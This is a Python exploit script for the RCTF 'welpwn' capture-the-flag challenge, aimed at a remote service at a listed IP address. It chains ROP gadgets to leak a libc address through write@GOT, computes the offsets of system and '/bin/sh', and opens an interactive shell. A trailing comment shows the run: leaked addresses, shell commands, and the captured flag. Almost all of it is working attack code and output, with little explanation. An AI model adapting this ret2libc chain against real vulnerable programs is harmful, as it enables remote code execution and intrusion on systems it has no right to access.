from amnesia import *
import struct
import time

# RCTF
# amn3s1a / www.amn3s1a.com
# Nox / noxsoft.net

p = lambda x : struct.pack('<Q', x)
u = lambda x : struct.unpack('<Q', x)[0]

REMOTE = 1

port = 6666

if REMOTE:
	host = '180.76.178.48'
else:
	host = '127.0.0.1'

global s
s = amnesiaSock(host, port)

pop_rdi = p(0x004008a3)# : pop rdi; ret
pop_rsi_pop = p(0x004008a1)# : pop rsi; pop r15; ret
pop_pop_pop_ret = p(0x0040089E)
ppppp_ret = p(0x0040089b)

write_got = p(0x601020)
write_plt = p(0x4005B0)

ptr_main = p(0x04007CD)

def call_write(ptr, rip):
	first_arg = pop_rdi
	first_data = p(1)

	second_arg = pop_rsi_pop
	second1_data = ptr
	second2_data = 'B'*8

	go_write = write_plt

	control_flow = rip

	_rop = first_arg + first_data + second_arg + second1_data + second2_data + go_write + control_flow
	return _rop

def call_system(go_system, sh):
	first_arg = pop_rdi
	first_data = sh

	_rop = first_arg + first_data + go_system
	return _rop

control_rip = "A"*0x18 + pop_pop_pop_ret + "A"*0x18
#control_rip = "A"*24 + ppppp_ret + "A"*8 + ppppp_ret + p(0x601030) + "A"*32


rop_write = call_write(write_got, ptr_main)
payload = control_rip + rop_write

s.readUntil('Welcome to RCTF\n')
s.writeLine(payload)

print "[Respuesta]"

time.sleep(0.5)
r = s.read(4096)

ptr_write = u(r[0:8])
print "[*] write @ %X" % ptr_write

libc = ptr_write - 0x0EB860
print "[*] libc @ %X" % libc

p_sh = p(libc + 0x017CCDB)
ptr_system = p(libc + 0x46640)

rop_system = call_system(ptr_system, p_sh) 

s.writeLine(control_rip+rop_system)
s.interactive_shell()

'''
$ python xpl-welpwn.py 

[Respuesta]
[*] write @ 7FDC99E0F860
[*] libc @ 7FDC99D24000

ls

ls
bin
boot
dev
etc
home
lib
lib32
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
whoami
ctf
id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
cat /home/ctf/flag
RCTF{W3LC0M3GUYS_Enjoy1T}
'''
